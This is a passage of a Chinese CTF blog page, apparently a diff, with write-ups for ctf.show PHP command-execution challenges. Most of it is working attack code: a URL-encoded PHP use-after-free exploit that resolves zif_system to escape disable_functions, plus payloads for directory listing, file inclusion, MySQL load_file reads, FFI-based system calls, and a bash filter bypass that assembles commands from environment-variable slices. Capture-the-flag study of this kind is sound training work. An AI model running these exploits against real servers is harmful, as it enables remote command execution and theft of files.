%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;)%3B%0A%0A%20%20%20%20trigger_uaf(&#39;x&#39;)%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B&#39;args&#39;%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#39;t%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403171847531.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403171847531"></p>
+
+<h1 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h1><pre><code>查位置
+c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);
+
+payload
+c=include(&quot;/flagc.txt&quot;);exit(0);
+c=require(&quot;/flagc.txt&quot;);exit(0);
+c=require_once(&quot;/flagc.txt&quot;);exit(0);
+</code></pre>
+<h1 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h1><h2 id="利用mysql-load-file读取文件"><a href="#利用mysql-load-file读取文件" class="headerlink" title="利用mysql load_file读取文件"></a>利用mysql load_file读取文件</h2><pre><code>查位置
+c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);
+c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);
+
+c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,
+&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)
+&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-
+&gt;getMessage();exit(0);&#125;exit(0);
+</code></pre>
+<p>利用mysql load_file读取文件,但是用户名密码怎么知道的?</p>
+<h1 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h1><pre><code>位置
+c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);
+c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);
+
+c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,
+&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36d.txt&quot;)&#39;) as $row)
+&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-
+&gt;getMessage();exit(0);&#125;exit(0);
+</code></pre>
+<h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><pre><code>位置
+c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);
+c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);
+
+c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);
+$a=&#39;/readflag &gt; 1.txt&#39;;
+$ffi-&gt;system($a);
+
+接着访问1.txt
+</code></pre>
+<h1 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h1><h2 id="环境变量构造nl命令"><a href="#环境变量构造nl命令" class="headerlink" title="环境变量构造nl命令"></a>环境变量构造nl命令</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403181813720.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403181813720"></p>
+
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403181913365.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403181913365"></p>
+
+<p>fuzz一下</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403184156712.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>发现只有大写A-Z和${}~.?:</p>
+<pre><code>Linux
+echo $&#123;PWD&#125;            #/root
+echo $&#123;PWD:0:1&#125;        #/    表示从0下标开始的第一个字符
+echo $&#123;PWD:~0:1&#125;    #t    表示从结尾开始往前的第一个字符
+echo $&#123;PWD:~0&#125;        #t    
+echo $&#123;PWD:~A&#125;        #t    字母和0具有同样作用
+echo $&#123;PWD:~A&#125;        #/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+</code></pre>
+<p>利用环境变量构造nl命令</p>
+<pre><code>$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???
+$&#123;PATH:~A&#125;-&gt;n
+$&#123;PWD:~A&#125;-&gt;l
+$IFS    空格
+</code></pre>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403184225406.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220403184225406"></p>
+
+<p>&#96;&#96;&#96;<br>SHLVL是记录多个Bash进程实例嵌套深度的累加器,进程第一次打开shell时,${SHLVL}&#x3D;1,然后在此shell中在打开一个shell是${SELVL}&#x3D;2<br>${PWD:$是0<br>${SHLVL}是1<br>$:$:$</p>
+
+	</div>
+
+	
+
+	
+
+	
+		<div class="post-tags">
+			<i class="fa fa-tags" aria-hidden="true"></i>
+			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/ctf-show/" rel="tag">ctf.show</a>
+		</div>
+	
+</article>
+
+	<div id="share_container">
+	<div id="share" data-initialized="true">
+		<a class="no-pjax icon-wechat" tooltip="分享到微信">
+			<button class="btn btn-icon btn-success">
+				<span class="btn-inner--icon"><i class="fa fa-weixin"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-douban" tooltip="分享到豆瓣">
+			<button class="btn btn-icon btn-primary" style="background: #209261;border: none;">
+				豆
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-qq" tooltip="分享到 QQ">
+			<button class="btn btn-icon btn-primary" style="background: #2196f3;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-qq"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-qzone" tooltip="分享到 QQ 空间">
+			<button class="btn btn-icon btn-primary" style="background: #ffc107;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-star"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-weibo" tooltip="分享到微博">
+			<button class="btn btn-icon btn-warning">
+				<span class="btn-inner--icon"><i class="fa fa-weibo"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-facebook" tooltip="分享到 Facebook">
+			<button class="btn btn-icon btn-primary" style="background: #283593;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-facebook"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-twitter" tooltip="分享到 Twitter">
+			<button class="btn btn-icon btn-primary" style="background: #03a9f4;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=https://lovewanan.github.io/ctfshow/ctf.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/&text=命令执行" tooltip="分享到 Telegram">
+			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-copy-link" id="share_copy_link" tooltip="复制链接">
+			<button class="btn btn-icon btn-default">
+				<span class="btn-inner--icon"><i class="fa fa-link"></i></span>
+			</button>
+		</a>
+	</div>
+	<button id="share_show" class="btn btn-icon btn-primary" tooltip="分享">
+		<span class="btn-inner--icon"><i class="fa fa-share"></i></span>
+	</button>
+</div>
+<script type="text/javascript">
+	socialShare("#share", {
+	    title : '命令执行',
+	    description : 'web29
+源码开局
+
+拼接
+c=system(&amp;#39;a=g;cat$IFS$1fla$a.ph...',
+	    wechatQrcodeTitle : "分享到微信",
+	    wechatQrcodeHelper : '微信扫描二维码',
+	    source : 'https://lovewanan.github.io/ctfshow/ctf.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/'
+	});
+	$("#share_show")[0].onclick = function(){
+		$("#share_container").addClass("opened");
+	};
+	$("#share_copy_link")[0].onclick = function(){
+		let input = document.createElement('input');
+		document.body.appendChild(input);
+		input.setAttribute("value", window.location.href);
+		input.setAttribute("readonly", "readonly");
+		input.setAttribute("style", "opacity: 0;mouse-events:none;");
+		input.select();
+		if (document.execCommand('copy')){
+			iziToast.show({
+				title: '链接已复制',
+				message: "链接已复制到剪贴板",
+				class: 'shadow',
+				position: 'topRight',
+				backgroundColor: '#2dce89',
+				titleColor: '#ffffff',
+				messageColor: '#ffffff',
+				iconColor: '#ffffff',
+				progressBarColor: '#ffffff',
+				icon: 'fa fa-check',
+				timeout: 5000
+			});
+		}else{
+			iziToast.show({
+				title: '复制失败',
+				message: "请手动复制链接",
+				class: 'shadow',
+				position: 'topRight',
+				backgroundColor: '#f5365c',
+				titleColor: '#ffffff',
+				messageColor: '#ffffff',
+				iconColor: '#ffffff',
+				progressBarColor: '#ffffff',
+				icon: 'fa fa-close',
+				timeout: 5000
+			});
+		}
+		document.body.removeChild(input);
+	};
+</script>
+
+
+
+
+	<div id="post_comment" class="card shadow-sm">
+		<div id="waline"></div>
+<script>
+  Waline({
+	el: '#waline',
+	serverURL: 'https://waline-jaua9chtw-lovewanan.vercel.app',
+  });
+</script>
+
+	</div>
+
+
+<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/ctfshow/ctf.show/%E5%A4%A7%E8%B5%9B%E5%8E%9F%E5%9E%8B/" rel="prev"> 大赛原型</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/ctfshow/ctf.show/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next"> 反序列化</a></div></div>
+
+
+
+
+		
+		
+		
+		
+
+					<footer id="footer" class="site-footer card shadow-sm border-0">
+						
+						<div>Theme <a target="_blank" rel="noopener" href="https://github.com/solstice23/hexo-theme-argon"><strong>Argon</strong></a> | Powered by Hexo</div>
+						<span id="busuanzi_container_site_uv">
+							本站访客数 <span id="busuanzi_value_site_uv"></span> 人次
+						</span>
+					</footer>
+				</main>
+			</div>
+		</div>
+		
+<script src="/argontheme.js"></script>
+
+		
+		
+		
+
+		
+			<script>
+				var argonEnableCodeHighlight = true;
+			</script>
+			
+<link rel="stylesheet" href="/assets/vendor/highlight/styles/github-gist.css">
+
+		
+
+	</div>
+</div>
+<noscript>
+	<style>
+		article img.lazyload[src^="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPg"]{display: none;}
+		.comment-item-text .comment-sticker.lazyload{display: none;}
+	</style>
+</noscript>
+</body>
+
+
+
+</html>
+
